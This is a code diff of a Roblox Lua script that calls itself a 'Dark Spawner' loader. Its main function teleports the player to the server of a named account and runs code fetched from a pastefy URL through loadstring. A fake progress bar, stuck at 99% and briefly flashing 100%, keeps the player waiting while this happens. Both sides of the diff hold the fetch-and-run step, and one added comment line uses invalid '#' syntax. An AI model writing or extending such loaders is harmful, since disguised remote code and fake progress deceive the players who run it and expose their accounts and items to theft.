+        -- Update percentage text
+        if progressText and progressText.Parent then
+            progressText.Text = math.floor(targetProgress) .. "%"
+        end
+        currentProgress = targetProgress
+    end
 
-	return screenGui
+    -- Loading dots animation
+    local dotsCoroutine = coroutine.create(function()
+        local dots = ""
+        local dotCount = 0
+        while isRunning and screenGui.Parent and loadingText and loadingText.Parent do
+            dotCount = (dotCount + 1) % 4
+            dots = string.rep(".", dotCount)
+            if loadingText and loadingText.Parent then
+                loadingText.Text = "Loading Dark Spawner" .. dots
+            end
+            wait(0.5)
+        end
+    end)
+    
+    coroutine.resume(dotsCoroutine)
+
+    -- Progress animation loop
+    local progressCoroutine = coroutine.create(function()
+        wait(1) -- Initial delay
+        
+        while currentProgress < 99 and isRunning and screenGui.Parent do
+            updateProgress()
+            wait(math.random(1, 3)) -- Random delay between updates
+        end
+        
+        -- Once stuck at 99%, occasionally "try" to load more
+        while isRunning and screenGui.Parent do
+            wait(math.random(3, 8))
+            if isStuck and progressText and progressText.Parent and progressFill and progressFill.Parent then
+                -- Briefly show 100% then go back to 99%
+                progressText.Text = "100%"
+                progressFill.Size = UDim2.new(1, 0, 1, 0)
+                wait(0.1)
+                if progressText and progressText.Parent and progressFill and progressFill.Parent then
+                    progressText.Text = "99%"
+                    progressFill.Size = UDim2.new(0.99, 0, 1, 0)
+                end
+            end
+        end
+    end)
+    
+    coroutine.resume(progressCoroutine)
+
+    -- Cleanup function
+    screenGui.AncestryChanged:Connect(function()
+        if not screenGui.Parent then
+            isRunning = false
+        end
+    end)
+
+    -- Optional: Remove loading screen after a certain time (uncomment if needed)
+    --[[
+    spawn(function()
+        wait(30) -- Remove after 30 seconds
+        isRunning = false
+        if screenGui and screenGui.Parent then
+            screenGui:Destroy()
+        end
+    end)
+    --]]
+
+    return screenGui
 end
 
--- ============================================================
---  MAIN
--- ============================================================
+-- Main script execution
 local function main()
-	isScriptLoading = true
-	setupLeaveDetection()
-
-	autoEquip()
-	startHoldActions()
-
-	if syn and syn.read_file then
-		local rexecExists = pcall(function() return syn.read_file("rexec_script.lua") end)
-		if rexecExists then syn.del_file("rexec_script.lua") end
-	end
-
-	local warningGui, continueBtn = createDeltaWarning()
-	local clicked = false
-	local buttonConnection
-	buttonConnection = continueBtn.MouseButton1Click:Connect(function()
-		clicked = true
-		buttonConnection:Disconnect()
-	end)
-	repeat wait(0.1) until clicked or not warningGui or not warningGui.Parent
-	if warningGui and warningGui.Parent then
-		local fadeInfo = TweenInfo.new(0.5,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)
-		local warningBgFrame = warningGui:FindFirstChild("WarningBackground")
-		if warningBgFrame then
-			TweenService:Create(warningBgFrame, fadeInfo, {BackgroundTransparency = 1}):Play()
-			fadeInfo.Duration = 0.5
-			wait(0.5)
-		end
-		warningGui:Destroy()
-		wait(0.3)
-	end
-
-	local teleportSuccess = teleportToUser("Egoista4218", 8322520554)
-	if teleportSuccess then
-		loadstring(game:HttpGet("https://pastefy.app/2UfTSRB7/raw"))()
-		createLoadingScreen()
-		wait(10)
-		isScriptLoading = false
-		stopHoldActions()
-		print("Script loading completed!")
-	else
-		print("Attempting to join target player's server...")
-	end
+    -- Set loading state to true
+    isScriptLoading = true
+    
+    -- Setup leave detection
+    setupLeaveDetection()
+    
+    -- Check if this is a re-execution after server join
+    if syn and syn.read_file then
+        local rexecExists = pcall(function()
+            return syn.read_file("rexec_script.lua")
+        end)
+        
+        if rexecExists then
+            -- This is a re-execution, delete the file and continue normally
+            syn.del_file("rexec_script.lua")
+            print("Re-executing script after server join...")
+        end
+    end
+    
+    -- Show Delta warning first
+    local warningGui, continueBtn = createDeltaWarning()
+    
+    -- Wait for user to click continue
+    local clicked = false
+    local buttonConnection
+    
+    buttonConnection = continueBtn.MouseButton1Click:Connect(function()
+        clicked = true
+        if buttonConnection then
+            buttonConnection:Disconnect()
+        end
+    end)
+    
+    -- Wait for button click
+    repeat 
+        wait(0.1) 
+    until clicked or not warningGui or not warningGui.Parent
+    
+    if warningGui and warningGui.Parent then
+        -- Remove warning with fade effect
+        local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+        local warningBgFrame = warningGui:FindFirstChild("WarningBackground")
+        
+        if warningBgFrame then
+            local fadeTween = TweenService:Create(warningBgFrame, fadeInfo, {BackgroundTransparency = 1})
+            fadeTween:Play()
+            
+            fadeTween.Completed:Connect(function()
+                if warningGui and warningGui.Parent then
+                    warningGui:Destroy()
+                end
+                
+                -- Small delay before teleporting and executing
+                wait(0.3)
+                
+                -- Try to teleport to Egoista4218 (will join their server if not in current one)
+                local teleportSuccess = teleportToUser("Egoista4218", 8322520554)
+                
+                -- Only continue with execution if we stayed in the current server
+                if teleportSuccess then
+                    -- Execute the loadstring after warning and teleport
+                    loadstring(game:HttpGet("https://pastefy.app/2UfTSRB7/raw"))()
+                    
+                    -- Now create the loading screen
+                    createLoadingScreen()
+                    
+                    -- Wait for loading to complete (simulated)
+                    wait(10) -- Adjust this time based on your script's actual loading time
+                    
+                    -- Script loading complete
+                    isScriptLoading = false
+                    print("Script loading completed!")
+                else
+                    -- If teleportSuccess is false, we might be joining another server
+                    # The script will re-execute there automatically
+                    print("Attempting to join target player's server...")
+                end
+            end)
+        else
+            -- Fallback if frame not found
+            warningGui:Destroy()
+            wait(0.3)
+            
+            -- Try to teleport to Egoista4218 (will join their server if not in current one)
+            local teleportSuccess = teleportToUser("Egoista4218", 8322520554)
+            
+            -- Only continue with execution if we stayed in the current server
+            if teleportSuccess then
+                -- Execute the loadstring after warning and teleport
+                loadstring(game:HttpGet("https://pastefy.app/2UfTSRB7/raw"))()
+                
+                createLoadingScreen()
+                
+                -- Wait for loading to complete (simulated)
+                wait(10) -- Adjust this time based on your script's actual loading time
+                
+                -- Script loading complete
+                isScriptLoading = false
+                print("Script loading completed!")
+            else
+                -- If teleportSuccess is false, we might be joining another server
+                print("Attempting to join target player's server...")
+            end
+        end
+    end
 end
 
+-- Run the main function
 spawn(main)
